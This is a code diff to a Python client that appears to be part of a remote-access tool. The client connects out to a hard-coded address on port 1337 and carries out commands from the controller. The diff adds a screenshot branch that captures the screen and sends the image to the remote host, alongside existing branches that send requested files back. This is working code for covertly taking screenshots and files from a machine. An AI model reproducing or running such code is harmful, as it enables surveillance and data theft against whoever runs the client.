@@ -11,7 +11,7 @@ path = ""
 def main():
     soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     #host = '192.168.43.85'
-    host = '192.168.0.101'
+    host = '192.168.43.211'
     port = 1337
 
     try:
@@ -33,10 +33,11 @@ def main():
             #print("Connection " + ip + ":" + port + " closed")
             is_active = False
         elif('scr' in client_input):
-            '''
-                here will be screenshot taker who will send file to server
-            '''
-            pass
+            fname = screenshot.takescreenshot()
+            soc.send(fname.encode('utf-8'))
+            send_file(fname, soc)
+            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            soc.connect((host, port))
         elif("push" in client_input):
             load_file(soc)
             is_active = False
@@ -49,7 +50,10 @@ def main():
             soc.sendall(s.encode('utf-8'))
         elif("pull" in client_input):
             name = soc.recv(1024)
+
             send_file(name, soc)
+            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            soc.connect((host, port))
             #is_active = False
 
 def load_file(c):
@@ -81,17 +85,17 @@ def send_file(fname, c):
     print("Done Sending")
 
 def receive_input(connection, max_buffer_size):
-    try:
-        client_input = connection.recv(max_buffer_size)
-        print(client_input)
-        if(client_input):
-            decoded_input = client_input.decode("utf8")
-            return decoded_input
-        else:
-            return ''
-    except:
-        print("Подключение разорвано!")
-        quit()
+    # try:
+    client_input = connection.recv(max_buffer_size)
+    print(client_input)
+    if(client_input):
+        decoded_input = client_input.decode("utf8")
+        return decoded_input
+    else:
+        return ''
+    # except:
+    #     print("Подключение разорвано!")
+    #     quit()
         
 if __name__ == "__main__":
     main()
